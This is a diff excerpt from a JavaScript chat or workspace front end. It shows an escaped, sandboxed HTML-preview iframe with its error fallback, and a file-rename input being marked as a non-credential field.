         const safeHtml=html.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
         el.outerHTML=`<div class="html-preview-wrap"><div class="html-preview-header"><span>${t('html_sandbox_label')}</span><a href="${openUrl}" target="_blank" rel="noopener" class="html-open-link">${t('html_open_full')} ↗</a></div><iframe srcdoc="${safeHtml}" sandbox="allow-scripts" class="html-preview-iframe" loading="lazy"></iframe></div>`;
       })
       .catch(()=>{
-        const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
         el.outerHTML=`<div class="html-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('html_error')}</span></div>`;
       });
   });
@@ -22424,6 +23022,8 @@ function _renderTreeItems(container, entries, depth){
       }
       const inp=document.createElement('input');
       inp.className='file-rename-input';inp.value=item.name;
+      // #7542: workspace file rename, not a credentials field.
+      _markNonCredentialInput(inp);
       inp.onclick=(e2)=>e2.stopPropagation();
       const finish=async(save)=>{
         inp.onblur=null;
